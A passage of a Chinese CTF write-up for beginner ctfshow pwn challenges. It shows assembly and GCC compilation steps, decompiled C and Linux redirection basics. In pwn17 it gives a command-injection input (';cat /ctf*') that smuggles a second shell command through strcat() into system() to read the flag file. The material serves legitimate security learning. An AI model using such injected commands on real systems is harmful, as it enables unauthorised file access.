data-num=\"23\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">!=</span> n <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>                offset <span class=\"token operator\">+=</span> <span class=\"token function\">sprintf</span><span class=\"token punctuation\">(</span>output <span class=\"token operator\">+</span> offset<span class=\"token punctuation\">,</span> <span class=\"token string\">\"_\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">feof</span><span class=\"token punctuation\">(</span>fp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>            offset <span class=\"token operator\">+=</span> <span class=\"token function\">sprintf</span><span class=\"token punctuation\">(</span>output <span class=\"token operator\">+</span> offset<span class=\"token punctuation\">,</span> <span class=\"token string\">\" \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    offset <span class=\"token operator\">+=</span> <span class=\"token function\">sprintf</span><span class=\"token punctuation\">(</span>output <span class=\"token operator\">+</span> offset<span class=\"token punctuation\">,</span> <span class=\"token string\">\"&#125;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\\n\"</span><span class=\"token punctuation\">,</span> output<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token function\">fclose</span><span class=\"token punctuation\">(</span>fp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>此处有 <code>fopen(&quot;key&quot;,:&quot;rb&quot;)</code>  要打开文件 (rb 以读写方式打开一个二进制文件)，不能让其为空，手动创建一个 key 文件，题目说明 key 为 <code>CTFshow</code></p>\n<p>创建完成后用 gcc 编译，执行程序<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/17/pPhJc7Q.png\" alt=\"\" /></p>\n<h1 id=\"pwn15编译汇编代码形成可执行文件\"><a class=\"anchor\" href=\"#pwn15编译汇编代码形成可执行文件\">#</a> pwn15（编译汇编代码形成可执行文件）</h1>\n<p>## 题目<br />\n<img data-src=\"https://img1.imgtp.com/2023/09/19/14UYM6tT.png\" alt=\"\" /></p>\n<p><strong>【编译汇编代码】</strong></p>\n<p>[ams 基础，nasm 使用简介]：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ppYW5nd2VpMDUxMi9hcnRpY2xlL2RldGFpbHMvNTE2MzY2MDI=\">https://blog.csdn.net/jiangwei0512/article/details/51636602</span></p>\n<p>利用 <code>nasm</code>  命令，使用下面的命令将汇编代码编译成对象文件（会生成一个 pwn15.o 的对象文件）：</p>\n<pre><code>nasm -f elf pwn15.ams  # -f 是指定编译出来的 .o文件的格式\n</code></pre>\n<p>【Linux 命令 —ld 命令】：<br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xNDE1MDA0\">https://cloud.tencent.com/developer/article/1415004</span></p>\n<pre><code>ld命令是二进制工具集GNU Binutils的一员，是GNU链接器，用于将目标文件与库链接为可执行程序或库文件。\n</code></pre>\n<p>利用 <code>ld</code>  命令将对象文件链接成可执行文件</p>\n<pre><code>ld -m elf_i386 -s-o pwn15 pwn.o #-m是模拟指定的链接器，-s忽略来自输出文件的所有符号信息，-o 指定生成文件名称\n</code></pre>\n<p>查看汇编：</p>\n<pre><code class=\"language-asm\">section .data\n    str1 db &quot;CTFshow&quot;,0\n    str2 db &quot;_3@sy&quot;,0\n    str3 db &quot;@ss3mb1y&quot;,0\n    str4 db &quot;_1s&quot;,0\n    str5 db &quot;ctfshow&#123;&quot;\n    str6 db &quot;&#125;&quot;\n\nsection .text\n    global _start\n\n_start:\n    mov eax, 4 \n    mov ebx, 1 \n    mov ecx, str5 \n    mov edx, 8\n    int 0x80 \n\n    mov eax, 4\n    mov ebx, 1\n    mov ecx, str3\n    mov edx, 8\n    int 0x80\n\n    mov eax, 4\n    mov ebx, 1\n    mov ecx, str4\n    mov edx, 3\n    int 0x80\n\n    mov eax, 4\n    mov ebx, 1\n    mov ecx, str2\n    mov edx, 5\n    int 0x80\n\n    mov eax, 4\n    mov ebx, 1\n    mov ecx, str6\n    mov edx, 1\n    int 0x80\n\n    mov eax, 1 \n    xor ebx, ebx \n    int 0x80 \n\n</code></pre>\n<p>执行 <code>nasm -f elf pwn15.ams</code>  命令和 <code>ld -m elf_i386 -s-o pwn15 pwn.o </code> ，<br />\n会产生可执行文件 pwn15，执行即可（原对象文件不消失）</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/19/pP5PX4J.png\" alt=\"\" /></p>\n<h1 id=\"pwn16-使用gcc编译可执行文件\"><a class=\"anchor\" href=\"#pwn16-使用gcc编译可执行文件\">#</a> pwn16 （使用 gcc 编译可执行文件）</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xNTg1MDY2\">https://cloud.tencent.com/developer/article/1585066</span></p>\n<p>文件扩展名为.s 的文件其实就是汇编代码文件，使用下面的命令将汇编代码转成对应的二进制形式的 cpu 指令</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>gcc <span class=\"token parameter variable\">-c</span> main.s</pre></td></tr></table></figure><p>链接链接的作用是把代码之间的引用关系关联起来，最终生成一个完整的程序：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>gcc main.o libc.o  <span class=\"token comment\">#此题只需要一个目标文件，所以直接用 gcc main.o 即可</span></pre></td></tr></table></figure><h2 id=\"题目-11\"><a class=\"anchor\" href=\"#题目-11\">#</a> 题目</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/19/pP5iSjx.png\" alt=\"\" /></p>\n<p>【asm】(题目附件文件为 pwn15.s，s 其实就是汇编代码文件)</p>\n<pre><code class=\"language-asm\">\t.file\t&quot;flag.c&quot;\n\t.text\n\t.section\t.rodata\n.LC0:\n\t.string\t&quot;ctfshow&#123;&quot;\n\t.text\n\t.globl\tctfshow\n\t.type\tctfshow, @function\nctfshow:\n.LFB0:\n\t.cfi_startproc\n\tpushq\t%rbp\n\t.cfi_def_cfa_offset 16\n\t.cfi_offset 6, -16\n\tmovq\t%rsp, %rbp\n\t.cfi_def_cfa_register 6\n\tsubq\t$32, %rsp\n\tmovq\t%rdi, -24(%rbp)\n\tleaq\t.LC0(%rip), %rdi\n\tmovl\t$0, %eax\n\tcall\tprintf@PLT\n\tmovl\t$0, -4(%rbp)\n\tjmp\t.L2\n.L3:\n\tmovl\t-4(%rbp), %eax\n\tmovslq\t%eax, %rdx\n\tmovq\t-24(%rbp), %rax\n\taddq\t%rdx, %rax\n\tmovzbl\t(%rax), %eax\n\tmovzbl\t%al, %eax\n\tmovl\t%eax, %edi\n\tcall\tputchar@PLT\n\taddl\t$1, -4(%rbp)\n.L2:\n\tcmpl\t$15, -4(%rbp)\n\tjle\t.L3\n\tmovl\t$125, %edi\n\tcall\tputchar@PLT\n\tnop\n\tleave\n\t.cfi_def_cfa 7, 8\n\tret\n\t.cfi_endproc\n.LFE0:\n\t.size\tctfshow, .-ctfshow\n\t.section\t.rodata\n.LC1:\n\t.string\t&quot;%2hhx&quot;\n\t.text\n\t.globl\tmain\n\t.type\tmain, @function\nmain:\n.LFB1:\n\t.cfi_startproc\n\tpushq\t%rbp\n\t.cfi_def_cfa_offset 16\n\t.cfi_offset 6, -16\n\tmovq\t%rsp, %rbp\n\t.cfi_def_cfa_register 6\n\tsubq\t$64, %rsp\n\tmovq\t%fs:40, %rax\n\tmovq\t%rax, -8(%rbp)\n\txorl\t%eax, %eax\n\tmovabsq\t$4122593792332543030, %rax\n\tmovabsq\t$3834596513518335287, %rdx\n\tmovq\t%rax, -32(%rbp)\n\tmovq\t%rdx, -24(%rbp)\n\tmovl\t$825635894, -16(%rbp)\n\tmovb\t$0, -12(%rbp)\n\tmovl\t$0, -52(%rbp)\n\tjmp\t.L5\n.L6:\n\tleaq\t-48(%rbp), %rdx\n\tmovl\t-52(%rbp), %eax\n\tcltq\n\taddq\t%rax, %rdx\n\tmovl\t-52(%rbp), %eax\n\taddl\t%eax, %eax\n\tleaq\t-32(%rbp), %rcx\n\tcltq\n\taddq\t%rcx, %rax\n\tleaq\t.LC1(%rip), %rsi\n\tmovq\t%rax, %rdi\n\tmovl\t$0, %eax\n\tcall\t__isoc99_sscanf@PLT\n\taddl\t$1, -52(%rbp)\n.L5:\n\tcmpl\t$15, -52(%rbp)\n\tjle\t.L6\n\tleaq\t-48(%rbp), %rax\n\tmovq\t%rax, %rdi\n\tcall\tctfshow\n\tmovl\t$0, %eax\n\tmovq\t-8(%rbp), %rsi\n\txorq\t%fs:40, %rsi\n\tje\t.L8\n\tcall\t__stack_chk_fail@PLT\n.L8:\n\tleave\n\t.cfi_def_cfa 7, 8\n\tret\n\t.cfi_endproc\n.LFE1:\n\t.size\tmain, .-main\n\t.ident\t&quot;GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0&quot;\n\t.section\t.note.GNU-stack,&quot;&quot;,@progbits\n</code></pre>\n<p>使用命令</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>gcc <span class=\"token parameter variable\">-c</span> pwn16.s</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>gcc pwn16.o  <span class=\"token comment\">#不用 - o 指定生成文件名默认为 a.out</span></pre></td></tr></table></figure><p><img data-src=\"https://z1.ax1x.com/2023/09/19/pP5FnJJ.png\" alt=\"\" /></p>\n<h1 id=\"pwn17-linux命令基础\"><a class=\"anchor\" href=\"#pwn17-linux命令基础\">#</a> pwn17 (Linux 命令基础)</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhbmRhb3l1L2FydGljbGUvZGV0YWlscy8xMTcyOTY5MDc=\">https://blog.csdn.net/bandaoyu/article/details/117296907</span></p>\n<p>逐条执行命令：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin class-name\">echo</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> <span class=\"token builtin class-name\">echo</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span> <span class=\"token builtin class-name\">echo</span> <span class=\"token number\">3</span>  <span class=\"token comment\">#即使命令执行错误也不影响后面的命令继续执行</span></pre></td></tr></table></figure><h2 id=\"题目-12\"><a class=\"anchor\" href=\"#题目-12\">#</a> 题目</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/19/pP5AmvR.png\" alt=\"\" /></p>\n<p>64 位程序，保护全开，ida 看一下</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> __cdecl <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>argv<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>envp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> v4<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+4h] [rbp-1Ch] BYREF</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">char</span> dest<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+Ah] [rbp-16h] BYREF</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">char</span> buf<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+Eh] [rbp-12h] BYREF</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> __int64 v7<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+18h] [rbp-8h]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  v7 <span class=\"token operator\">=</span> <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token function\">setvbuf</span><span class=\"token punctuation\">(</span>_bss_start<span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token function\">setvbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdin</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span>asc_D48<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span>asc_DC0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span>asc_E40<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span>asc_ED0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span>asc_F60<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span>asc_FE8<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span>asc_1080<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"    * *************************************                           \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span>aClassifyCtfsho<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"    * Type  : Linux_Security_Mechanisms                               \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"    * Site  : https://ctf.show/                                       \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"    * Hint  : You should understand the basic command usage of Linux! \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"    * *************************************                           \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>  <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>dest <span class=\"token operator\">=</span> <span class=\"token number\">790655852</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>  v4 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\nHow much do you know about Linux commands? \\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token function\">menu</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    v4 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\nEnter the command you want choose:(1.2.3.4 or 5)\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token function\">__isoc99_scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>v4<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span> v4 <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>      <span class=\"token keyword\">case</span> <span class=\"token number\">1</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"id\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>      <span class=\"token keyword\">case</span> <span class=\"token number\">2</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Which directory?('/','./' or the directiry you want?)\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>        <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">,</span> <span class=\"token number\">0xAuLL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>        <span class=\"token function\">strcat</span><span class=\"token punctuation\">(</span>dest<span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span>dest<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>        <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Execution succeeded!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>      <span class=\"token keyword\">case</span> <span class=\"token number\">3</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>        <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">1u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>        <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"$cat /ctfshow_flag\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>        <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">1u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>        <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ctfshow&#123;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>        <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">2u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>        <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"... ...\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>        <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">3u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>        <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Your flag is ...\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>        <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">5u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>        <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ctfshow&#123;flag is not here!&#125;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>        <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x14u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>        <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"wtf?You haven't left yet?\\nOk~ give you flag:\\nflag is loading......\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>        <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x1BF52u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"cat /ctfshow_flag\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>      <span class=\"token keyword\">case</span> <span class=\"token number\">4</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>        <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">2u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>        <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"su: Authentication failure\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>      <span class=\"token keyword\">case</span> <span class=\"token number\">5</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>        <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"See you!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>        <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>      <span class=\"token keyword\">default</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>        <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"command not found!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>发现在 <code>case 3</code>  中，有 <code>system（&quot;cat /flag&quot;）</code> 但是中间会有等待时间（sleep（0x1bf52）单位为毫秒）</p>\n<p>而在 <code>case 2</code>  中，有一个 <code>strcat（）</code> 会将我们输入的值添加到 <code>dest</code>  后面，然后执行，在此输入 <code>cat /ctfshow_flag</code>  会导致无限循环（可能因为命令没有加；分割导致，并且没有清空 buf，导致不断执行）</p>\n<p>此处需要将命令利用 <code>;</code>  分开，分别执行， <code>read</code>  读 10 个字节，所以需要使用通配符 <code>*</code></p>\n<p>输入命令 <code>;cat /ctf*</code>  即可</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/19/pP5eh6J.png\" alt=\"\" /></p>\n<h1 id=\"pwn18linux命令基础\"><a class=\"anchor\" href=\"#pwn18linux命令基础\">#</a> pwn18（Linux 命令基础）</h1>\n<h2 id=\"题目-13\"><a class=\"anchor\" href=\"#题目-13\">#</a> 题目</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/19/pP5eHk6.png\" alt=\"\" /></p>\n<p>64 位程序，保护全开了，ida 查看<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/19/pP5mEcQ.png\" alt=\"\" /></p>\n<p>fake()<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/19/pP5mVXj.png\" alt=\"\" /></p>\n<p>real()<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/19/pP5mn7q.md.png\" alt=\"\" /></p>\n<p>发现这个两个函数的输出定向符不同</p>\n<p><code>&gt;&gt;</code>  会换行，将命令产生的结果输出在已有文件内容的下一行开始</p>\n<p><code>&gt;</code>    命令的输出结果覆盖原有文件的内容（会清空旧内容）</p>\n<p>这两个重定向符如果指定输出的文件不存在就创建这个文件</p>\n<p>回到题目，由于我们要输出 flag，所以不能让原内容清空，就只能用 <code>fake()</code>  函数，也就是我们需要满足 <code>v4==9</code>  这个条件，即输入 9 即可</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/19/pP5nlVI.png\" alt=\"\" /></p>\n<h1 id=\"pwn19linux基础命令\"><a class=\"anchor\" 